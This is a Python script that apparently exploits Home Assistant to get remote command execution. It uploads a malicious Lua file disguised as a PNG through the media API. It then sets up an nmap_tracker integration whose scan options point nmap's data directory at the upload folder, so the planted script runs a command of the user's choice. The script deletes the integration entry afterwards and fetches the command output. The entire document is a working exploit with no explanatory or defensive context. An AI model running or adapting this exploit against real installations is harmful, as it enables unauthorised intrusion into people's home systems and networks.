import time
import requests

hostname = input('Hass URL: ')
token = input('Authorization: Bearer ')
cmdline = input('Command: ')

if not hostname.endswith('/'):
    hostname = hostname + '/'
    
cmdline = cmdline.replace('\\', '\\\\').replace('"', '\\"')
    
def upload_media(fn, content):
    print('=== upload media', fn)
    res = requests.post(
        f'{hostname}api/media_source/local_source/upload',
        headers={
            'Authorization': f'Bearer {token}',
        },
        data={
            'media_content_id': 'media-source://media_source/local/.',
        },
        files={
            'file': (fn, content.encode('utf-8'), 'image/png'),
        },
    )
    res.raise_for_status()
    
def download_media(fn):
    print('=== download media', fn)
    res = requests.get(
        f'{hostname}media/local/{fn}',
        headers={
            'Authorization': f'Bearer {token}',
        },
    )
    print(res.text)
    return res.text
    
def setup_nmap(options):
    print('=== create nmap flow')
    res = requests.post(
        f'{hostname}api/config/config_entries/flow',
        headers={
            'Authorization': f'Bearer {token}',
        },
        json={
            'handler':  'nmap_tracker',
            'show_advanced_options': False,
        },
    )
    res.raise_for_status()
    flow_id = res.json()['flow_id']
    
    print('=== complete nmap flow')
    res = requests.post(
        f'{hostname}api/config/config_entries/flow/{flow_id}',
        headers={
            'Authorization': f'Bearer {token}',
        },
        json={
            'hosts': '127.0.0.1',
            'home_interval': 9999,
            'scan_options': options,
        },
    )
    res.raise_for_status()
    entry_id = res.json()['result']['entry_id']
    
    print('=== wait it to finish')
    time.sleep(2)
    
    return entry_id
    
def teardown_nmap(entry_id):
    print('=== delete nmap entry')
    res = requests.delete(
        f'{hostname}api/config/config_entries/entry/{entry_id}',
        headers={
            'Authorization': f'Bearer {token}',
        },
        json={
            'require_restart': False,
        },
    )
    res.raise_for_status()

upload_media('nse_main.lua', f'''
local os = require "os";
os.execute("{cmdline} > /media/out.png");
''')

entry = setup_nmap('--datadir /media --script=foo')

teardown_nmap(entry)

download_media('out.png')

print('=== done')